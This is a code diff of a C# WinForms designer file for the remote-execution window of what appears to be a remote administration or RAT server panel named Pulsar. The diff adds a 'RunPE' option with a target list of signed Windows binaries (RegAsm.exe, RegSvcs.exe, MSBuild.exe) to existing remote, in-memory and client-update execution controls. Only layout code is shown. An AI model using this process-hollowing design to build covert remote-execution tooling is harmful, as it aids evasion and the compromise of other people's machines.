@@ -28,203 +28,258 @@
         /// </summary>
         private void InitializeComponent()
         {
-            Pulsar.Server.Utilities.ListViewColumnSorter listViewColumnSorter1 = new Pulsar.Server.Utilities.ListViewColumnSorter();
             System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmRemoteExecution));
-            this.btnExecute = new System.Windows.Forms.Button();
-            this.txtURL = new System.Windows.Forms.TextBox();
-            this.lblURL = new System.Windows.Forms.Label();
-            this.groupLocalFile = new System.Windows.Forms.GroupBox();
-            this.btnBrowse = new System.Windows.Forms.Button();
-            this.txtPath = new System.Windows.Forms.TextBox();
-            this.label1 = new System.Windows.Forms.Label();
-            this.groupURL = new System.Windows.Forms.GroupBox();
-            this.radioLocalFile = new System.Windows.Forms.RadioButton();
-            this.radioURL = new System.Windows.Forms.RadioButton();
-            this.lstTransfers = new Pulsar.Server.Controls.AeroListView();
-            this.hClient = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
-            this.hStatus = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
-            this.chkUpdate = new System.Windows.Forms.CheckBox();
-            this.chkBoxReflectionExecute = new System.Windows.Forms.CheckBox();
-            this.groupLocalFile.SuspendLayout();
-            this.groupURL.SuspendLayout();
-            this.SuspendLayout();
+            btnExecute = new System.Windows.Forms.Button();
+            txtURL = new System.Windows.Forms.TextBox();
+            lblURL = new System.Windows.Forms.Label();
+            groupLocalFile = new System.Windows.Forms.GroupBox();
+            btnBrowse = new System.Windows.Forms.Button();
+            txtPath = new System.Windows.Forms.TextBox();
+            label1 = new System.Windows.Forms.Label();
+            groupURL = new System.Windows.Forms.GroupBox();
+            radioLocalFile = new System.Windows.Forms.RadioButton();
+            radioURL = new System.Windows.Forms.RadioButton();
+            lstTransfers = new Pulsar.Server.Controls.AeroListView();
+            hClient = new System.Windows.Forms.ColumnHeader();
+            hStatus = new System.Windows.Forms.ColumnHeader();
+            chkUpdate = new System.Windows.Forms.CheckBox();
+            chkBoxReflectionExecute = new System.Windows.Forms.CheckBox();
+            chkRunPE = new System.Windows.Forms.CheckBox();
+            cmbRunPETarget = new System.Windows.Forms.ComboBox();
+            lblRunPETarget = new System.Windows.Forms.Label();
+            txtRunPECustomPath = new System.Windows.Forms.TextBox();
+            btnBrowseRunPE = new System.Windows.Forms.Button();
+            groupLocalFile.SuspendLayout();
+            groupURL.SuspendLayout();
+            SuspendLayout();
             // 
             // btnExecute
             // 
-            this.btnExecute.Location = new System.Drawing.Point(353, 459);
-            this.btnExecute.Name = "btnExecute";
-            this.btnExecute.Size = new System.Drawing.Size(138, 23);
-            this.btnExecute.TabIndex = 6;
-            this.btnExecute.Text = "Execute remotely";
-            this.btnExecute.UseVisualStyleBackColor = true;
-            this.btnExecute.Click += new System.EventHandler(this.btnExecute_Click);
+            btnExecute.Location = new System.Drawing.Point(353, 488);
+            btnExecute.Name = "btnExecute";
+            btnExecute.Size = new System.Drawing.Size(138, 23);
+            btnExecute.TabIndex = 6;
+            btnExecute.Text = "Execute remotely";
+            btnExecute.UseVisualStyleBackColor = true;
+            btnExecute.Click += btnExecute_Click;
             // 
             // txtURL
             // 
-            this.txtURL.Location = new System.Drawing.Point(56, 25);
-            this.txtURL.Name = "txtURL";
-            this.txtURL.Size = new System.Drawing.Size(320, 22);
-            this.txtURL.TabIndex = 1;
+            txtURL.Location = new System.Drawing.Point(59, 25);
+            txtURL.Name = "txtURL";
+            txtURL.Size = new System.Drawing.Size(320, 22);
+            txtURL.TabIndex = 1;
             // 
             // lblURL
             // 
-            this.lblURL.AutoSize = true;
-            this.lblURL.Location = new System.Drawing.Point(20, 28);
-            this.lblURL.Name = "lblURL";
-            this.lblURL.Size = new System.Drawing.Size(30, 13);
-            this.lblURL.TabIndex = 0;
-            this.lblURL.Text = "URL:";
+            lblURL.AutoSize = true;
+            lblURL.Location = new System.Drawing.Point(20, 28);
+            lblURL.Name = "lblURL";
+            lblURL.Size = new System.Drawing.Size(30, 13);
+            lblURL.TabIndex = 0;
+            lblURL.Text = "URL:";
             // 
             // groupLocalFile
             // 
-            this.groupLocalFile.Controls.Add(this.btnBrowse);
-            this.groupLocalFile.Controls.Add(this.txtPath);
-            this.groupLocalFile.Controls.Add(this.label1);
-            this.groupLocalFile.Location = new System.Drawing.Point(12, 35);
-            this.groupLocalFile.Name = "groupLocalFile";
-            this.groupLocalFile.Size = new System.Drawing.Size(479, 75);
-            this.groupLocalFile.TabIndex = 1;
-            this.groupLocalFile.TabStop = false;
+            groupLocalFile.Controls.Add(btnBrowse);
+            groupLocalFile.Controls.Add(txtPath);
+            groupLocalFile.Controls.Add(label1);
+            groupLocalFile.Location = new System.Drawing.Point(12, 65);
+            groupLocalFile.Name = "groupLocalFile";
+            groupLocalFile.Size = new System.Drawing.Size(479, 75);
+            groupLocalFile.TabIndex = 1;
+            groupLocalFile.TabStop = false;
             // 
             // btnBrowse
             // 
-            this.btnBrowse.Location = new System.Drawing.Point(382, 23);
-            this.btnBrowse.Name = "btnBrowse";
-            this.btnBrowse.Size = new System.Drawing.Size(75, 23);
-            this.btnBrowse.TabIndex = 2;
-            this.btnBrowse.Text = "Browse...";
-            this.btnBrowse.UseVisualStyleBackColor = true;
-            this.btnBrowse.Click += new System.EventHandler(this.btnBrowse_Click);
+            btnBrowse.Location = new System.Drawing.Point(382, 23);
+            btnBrowse.Name = "btnBrowse";
+            btnBrowse.Size = new System.Drawing.Size(75, 23);
+            btnBrowse.TabIndex = 2;
+            btnBrowse.Text = "Browse...";
+            btnBrowse.UseVisualStyleBackColor = true;
+            btnBrowse.Click += btnBrowse_Click;
             // 
             // txtPath
             // 
-            this.txtPath.Location = new System.Drawing.Point(59, 24);
-            this.txtPath.Name = "txtPath";
-            this.txtPath.ReadOnly = true;
-            this.txtPath.Size = new System.Drawing.Size(317, 22);
-            this.txtPath.TabIndex = 1;
+            txtPath.Location = new System.Drawing.Point(59, 24);
+            txtPath.Name = "txtPath";
+            txtPath.ReadOnly = true;
+            txtPath.Size = new System.Drawing.Size(317, 22);
+            txtPath.TabIndex = 1;
             // 
             // label1
             // 
-            this.label1.AutoSize = true;
-            this.label1.Location = new System.Drawing.Point(20, 27);
-            this.label1.Name = "label1";
-            this.label1.Size = new System.Drawing.Size(33, 13);
-            this.label1.TabIndex = 0;
-            this.label1.Text = "Path:";
+            label1.AutoSize = true;
+            label1.Location = new System.Drawing.Point(20, 27);
+            label1.Name = "label1";
+            label1.Size = new System.Drawing.Size(33, 13);
+            label1.TabIndex = 0;
+            label1.Text = "Path:";
             // 
             // groupURL
             // 
-            this.groupURL.Controls.Add(this.txtURL);
-            this.groupURL.Controls.Add(this.lblURL);
-            this.groupURL.Enabled = false;
-            this.groupURL.Location = new System.Drawing.Point(12, 139);
-            this.groupURL.Name = "groupURL";
-            this.groupURL.Size = new System.Drawing.Size(479, 75);
-            this.groupURL.TabIndex = 3;
-            this.groupURL.TabStop = false;
+            groupURL.Controls.Add(txtURL);
+            groupURL.Controls.Add(lblURL);
+            groupURL.Enabled = false;
+            groupURL.Location = new System.Drawing.Point(12, 169);
+            groupURL.Name = "groupURL";
+            groupURL.Size = new System.Drawing.Size(479, 75);
+            groupURL.TabIndex = 3;
+            groupURL.TabStop = false;
             // 
             // radioLocalFile
             // 
-            this.radioLocalFile.AutoSize = true;
-            this.radioLocalFile.Checked = true;
-            this.radioLocalFile.Location = new System.Drawing.Point(12, 12);
-            this.radioLocalFile.Name = "radioLocalFile";
-            this.radioLocalFile.Size = new System.Drawing.Size(110, 17);
-            this.radioLocalFile.TabIndex = 0;
-            this.radioLocalFile.TabStop = true;
-            this.radioLocalFile.Text = "Execute local file";
-            this.radioLocalFile.UseVisualStyleBackColor = true;
-            this.radioLocalFile.CheckedChanged += new System.EventHandler(this.radioLocalFile_CheckedChanged);
+            radioLocalFile.AutoSize = true;
+            radioLocalFile.Checked = true;
+            radioLocalFile.Location = new System.Drawing.Point(12, 12);
+            radioLocalFile.Name = "radioLocalFile";
+            radioLocalFile.Size = new System.Drawing.Size(110, 17);
+            radioLocalFile.TabIndex = 0;
+            radioLocalFile.TabStop = true;
+            radioLocalFile.Text = "Execute local file";
+            radioLocalFile.UseVisualStyleBackColor = true;
+            radioLocalFile.CheckedChanged += radioLocalFile_CheckedChanged;
             // 
             // radioURL
             // 
-            this.radioURL.AutoSize = true;
-            this.radioURL.Location = new System.Drawing.Point(12, 116);
-            this.radioURL.Name = "radioURL";
-            this.radioURL.Size = new System.Drawing.Size(114, 17);
-            this.radioURL.TabIndex = 2;
-            this.radioURL.Text = "Execute from URL";
-            this.radioURL.UseVisualStyleBackColor = true;
-            this.radioURL.CheckedChanged += new System.EventHandler(this.radioURL_CheckedChanged);
+            radioURL.AutoSize = true;
+            radioURL.Location = new System.Drawing.Point(12, 146);
+            radioURL.Name = "radioURL";
+            radioURL.Size = new System.Drawing.Size(114, 17);
+            radioURL.TabIndex = 2;
+            radioURL.Text = "Execute from URL";
+            radioURL.UseVisualStyleBackColor = true;
+            radioURL.CheckedChanged += radioURL_CheckedChanged;
             // 
             // lstTransfers
             // 
-            this.lstTransfers.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
-            | System.Windows.Forms.AnchorStyles.Left) 
-            | System.Windows.Forms.AnchorStyles.Right)));
-            this.lstTransfers.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
-            this.hClient,
-            this.hStatus});
-            this.lstTransfers.FullRowSelect = true;
-            this.lstTransfers.HideSelection = false;
-            this.lstTransfers.Location = new System.Drawing.Point(12, 220);
-            listViewColumnSorter1.NeedNumberCompare = false;
-            listViewColumnSorter1.Order = System.Windows.Forms.SortOrder.None;
-            listViewColumnSorter1.SortColumn = 0;
-            this.lstTransfers.LvwColumnSorter = listViewColumnSorter1;
-            this.lstTransfers.Name = "lstTransfers";
-            this.lstTransfers.Size = new System.Drawing.Size(479, 233);
-            this.lstTransfers.TabIndex = 4;
-            this.lstTransfers.UseCompatibleStateImageBehavior = false;
-            this.lstTransfers.View = System.Windows.Forms.View.Details;
+            lstTransfers.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
+            lstTransfers.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] { hClient, hStatus });
+            lstTransfers.FullRowSelect = true;
+            lstTransfers.Location = new System.Drawing.Point(12, 250);
+            lstTransfers.Name = "lstTransfers";
+            lstTransfers.Size = new System.Drawing.Size(479, 230);
+            lstTransfers.TabIndex = 4;
+            lstTransfers.UseCompatibleStateImageBehavior = false;
+            lstTransfers.View = System.Windows.Forms.View.Details;
             // 
             // hClient
             // 
-            this.hClient.Text = "Client";
-            this.hClient.Width = 302;
+            hClient.Text = "Client";
+            hClient.Width = 302;
             // 
             // hStatus
             // 
-            this.hStatus.Text = "Status";
-            this.hStatus.Width = 173;
+            hStatus.Text = "Status";
+            hStatus.Width = 173;
             // 
             // chkUpdate
             // 
-            this.chkUpdate.AutoSize = true;
-            this.chkUpdate.Location = new System.Drawing.Point(180, 463);
-            this.chkUpdate.Name = "chkUpdate";
-            this.chkUpdate.Size = new System.Drawing.Size(167, 17);
-            this.chkUpdate.TabIndex = 5;
-            this.chkUpdate.Text = "Update clients with this file";
-            this.chkUpdate.UseVisualStyleBackColor = true;
+            chkUpdate.AutoSize = true;
+            chkUpdate.Location = new System.Drawing.Point(180, 492);
+            chkUpdate.Name = "chkUpdate";
+            chkUpdate.Size = new System.Drawing.Size(167, 17);
+            chkUpdate.TabIndex = 5;
+            chkUpdate.Text = "Update clients with this file";
+            chkUpdate.UseVisualStyleBackColor = true;
+            chkUpdate.CheckedChanged += chkUpdate_CheckedChanged;
             // 
             // chkBoxReflectionExecute
             // 
-            this.chkBoxReflectionExecute.Location = new System.Drawing.Point(128, 12);
-            this.chkBoxReflectionExecute.Name = "chkBoxReflectionExecute";
-            this.chkBoxReflectionExecute.Size = new System.Drawing.Size(177, 19);
-            this.chkBoxReflectionExecute.TabIndex = 7;
-            this.chkBoxReflectionExecute.Text = "Memory Execution (.NET only)";
-            this.chkBoxReflectionExecute.UseVisualStyleBackColor = true;
+            chkBoxReflectionExecute.Location = new System.Drawing.Point(128, 12);
+            chkBoxReflectionExecute.Name = "chkBoxReflectionExecute";
+            chkBoxReflectionExecute.Size = new System.Drawing.Size(177, 19);
+            chkBoxReflectionExecute.TabIndex = 7;
+            chkBoxReflectionExecute.Text = "Memory Execution (.NET only)";
+            chkBoxReflectionExecute.UseVisualStyleBackColor = true;
+            chkBoxReflectionExecute.CheckedChanged += chkBoxReflectionExecute_CheckedChanged;
+            // 
+            // chkRunPE
+            // 
+            chkRunPE.AutoSize = true;
+            chkRunPE.Location = new System.Drawing.Point(311, 14);
+            chkRunPE.Name = "chkRunPE";
+            chkRunPE.Size = new System.Drawing.Size(59, 17);
+            chkRunPE.TabIndex = 8;
+            chkRunPE.Text = "RunPE";
+            chkRunPE.UseVisualStyleBackColor = true;
+            chkRunPE.CheckedChanged += chkRunPE_CheckedChanged;
+            // 
+            // cmbRunPETarget
+            // 
+            cmbRunPETarget.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
+            cmbRunPETarget.Enabled = false;
+            cmbRunPETarget.FormattingEnabled = true;
+            cmbRunPETarget.Items.AddRange(new object[] { "RegAsm.exe", "RegSvcs.exe", "MSBuild.exe", "Custom Path" });
+            cmbRunPETarget.Location = new System.Drawing.Point(376, 11);
+            cmbRunPETarget.Name = "cmbRunPETarget";
+            cmbRunPETarget.Size = new System.Drawing.Size(115, 21);
+            cmbRunPETarget.TabIndex = 9;
+            cmbRunPETarget.SelectedIndexChanged += cmbRunPETarget_SelectedIndexChanged;
+            // 
+            // lblRunPETarget
+            // 
+            lblRunPETarget.AutoSize = true;
+            lblRunPETarget.Enabled = false;
+            lblRunPETarget.Location = new System.Drawing.Point(376, 14);
+            lblRunPETarget.Name = "lblRunPETarget";
+            lblRunPETarget.Size = new System.Drawing.Size(0, 13);
+            lblRunPETarget.TabIndex = 10;
+            // 
+            // txtRunPECustomPath
+            // 
+            txtRunPECustomPath.Enabled = false;
+            txtRunPECustomPath.Location = new System.Drawing.Point(12, 37);
+            txtRunPECustomPath.Name = "txtRunPECustomPath";
+            txtRunPECustomPath.Size = new System.Drawing.Size(396, 22);
+            txtRunPECustomPath.TabIndex = 11;
+            txtRunPECustomPath.Visible = false;
+            // 
+            // btnBrowseRunPE
+            // 
+            btnBrowseRunPE.Enabled = false;
+            btnBrowseRunPE.Location = new System.Drawing.Point(414, 36);
+            btnBrowseRunPE.Name = "btnBrowseRunPE";
+            btnBrowseRunPE.Size = new System.Drawing.Size(77, 23);
+            btnBrowseRunPE.TabIndex = 12;
+            btnBrowseRunPE.Text = "Browse...";
+            btnBrowseRunPE.UseVisualStyleBackColor = true;
+            btnBrowseRunPE.Visible = false;
+            btnBrowseRunPE.Click += btnBrowseRunPE_Click;
             // 
             // FrmRemoteExecution
             // 
-            this.AcceptButton = this.btnExecute;
-            this.AutoScaleDimensions = new System.Drawing.SizeF(96F, 96F);
-            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
-            this.ClientSize = new System.Drawing.Size(503, 494);
-            this.Controls.Add(this.chkBoxReflectionExecute);
-            this.Controls.Add(this.chkUpdate);
-            this.Controls.Add(this.lstTransfers);
-            this.Controls.Add(this.radioURL);
-            this.Controls.Add(this.radioLocalFile);
-            this.Controls.Add(this.groupURL);
-            this.Controls.Add(this.groupLocalFile);
-            this.Controls.Add(this.btnExecute);
-            this.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
-            this.Name = "FrmRemoteExecution";
-            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
-            this.Text = "Update []";
-            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.FrmRemoteExecution_FormClosing);
-            this.Load += new System.EventHandler(this.FrmRemoteExecution_Load);
-            this.groupLocalFile.ResumeLayout(false);
-            this.groupLocalFile.PerformLayout();
-            this.groupURL.ResumeLayout(false);
-            this.groupURL.PerformLayout();
-            this.ResumeLayout(false);
-            this.PerformLayout();
+            AcceptButton = btnExecute;
+            AutoScaleDimensions = new System.Drawing.SizeF(96F, 96F);
+            AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
+            ClientSize = new System.Drawing.Size(503, 521);
+            Controls.Add(btnBrowseRunPE);
+            Controls.Add(txtRunPECustomPath);
+            Controls.Add(lblRunPETarget);
+            Controls.Add(cmbRunPETarget);
+            Controls.Add(chkRunPE);
+            Controls.Add(chkBoxReflectionExecute);
+            Controls.Add(chkUpdate);
+            Controls.Add(lstTransfers);
+            Controls.Add(radioURL);
+            Controls.Add(radioLocalFile);
+            Controls.Add(groupURL);
+            Controls.Add(groupLocalFile);
+            Controls.Add(btnExecute);
+            Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
+            Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
+            Name = "FrmRemoteExecution";
+            StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            Text = "Update []";
+            FormClosing += FrmRemoteExecution_FormClosing;
+            Load += FrmRemoteExecution_Load;
+            groupLocalFile.ResumeLayout(false);
+            groupLocalFile.PerformLayout();
+            groupURL.ResumeLayout(false);
+            groupURL.PerformLayout();
+            ResumeLayout(false);
+            PerformLayout();
 
         }
 
@@ -245,5 +300,10 @@
         private System.Windows.Forms.ColumnHeader hStatus;
         public System.Windows.Forms.CheckBox chkUpdate;
         private System.Windows.Forms.CheckBox chkBoxReflectionExecute;
+        private System.Windows.Forms.CheckBox chkRunPE;
+        private System.Windows.Forms.ComboBox cmbRunPETarget;
+        private System.Windows.Forms.Label lblRunPETarget;
+        private System.Windows.Forms.TextBox txtRunPECustomPath;
+        private System.Windows.Forms.Button btnBrowseRunPE;
     }
 }
